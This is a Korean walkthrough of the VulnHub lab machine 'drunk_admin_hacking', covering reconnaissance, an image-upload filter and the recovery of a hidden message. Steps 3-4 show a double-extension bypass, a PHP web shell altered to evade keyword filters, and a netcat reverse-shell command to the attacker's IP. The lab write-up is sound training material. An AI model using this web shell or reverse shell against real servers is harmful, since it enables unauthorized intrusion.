취약한 머신 — drunk_admin_hacking

VulnHub에서 배포하는 취약하게 설계된 VM 챌린지. Bob이 Alice에게 보낸 데이트 약속의 숨겨진 메시지를 밝혀내는 것이 최종 목표

1. 정찰

[VM addr]:8880으로 접속하면 Tripios라는 이미지 업로드/공유 사이트 확인. nmap -p-로 포트 스캔해 22, 8880 포트만 열려있음을 확인. gobuster로 디렉토리 탐색해 images 폴더를 발견.

2. 업로드 로직 분석

소스코드에서 <img src="images/해시값.확장자"> 형태로 이미지가 로드되는 것을 확인. 해시값이 32자리인 것으로 보아 파일명을 MD5로 해시해 저장하는 구조로 추정, 해당 경로 접속으로 확인.

3. 확장자 필터링 테스트

시도내용물결과
test.php비움❌ Invalid file extension
test.jpg.php비움✅ 업로드 성공
test.php.jpg웹쉘 코드❌ 내용 키워드 차단

php로 끝나도 test.jpg.php는 통과되는 걸로 보아 블랙리스트가 아니라 jpg/png 확장자가 있어야 통과하는 화이트리스트 방식으로 추정. 여기에 더해 파일 내용 안의 특정 키워드도 걸러내는 2단계 필터링 구조로 판단.

4. 웹쉘 업로드

// 필터에 걸림
<?php system($_GET['cmd']); ?>

// 필터 우회 성공
<?php echo exec($_REQUEST['cmd']) ?>

system과 $_GET가 필터링되는 것을 확인하고, 대체 함수인 exec와 $_REQUEST로 우회. 파일명은 MD5 해시로 계산(echo -n "test.jpg.php" | md5sum)해 저장 경로를 특정.

nc -lvnp 4444   // 공격자 리스너

?cmd=nc [kali IP] 4444 -e /bin/bash

리버스 쉘 연결 성공, whoami로 www-data 권한 확인.

5. 시크릿 코드 발견

/var/www 경로에서 숨겨진 .proof 파일을 발견. 영어 대소문자·숫자로만 구성된 값이라 Base64로 추정하고 디코딩해 시크릿 코드(Lh%1L^r2CH7%7Q#) 획득.

6. bob 사용자 디렉토리 접근

일반적인 경로(/../../../../home/bob/public_html/)로는 접속 불가 → Apache의 mod_userdir 모듈이 ~username 형태의 URL을 해당 사용자 public_html 폴더로 매핑한다는 점을 파악하고 http://[server]:8880/~bob/로 정상 접속.

7. 최종 목표 달성

앞서 얻은 시크릿 코드를 bob 페이지에 입력해 좌표값을 획득 → 구글 지도에서 검색한 결과, Bob이 Alice에게 보낸 데이트 약속 장소는 그리스 하니아의 옛 베네치아 항구 인근 도로로 확인.
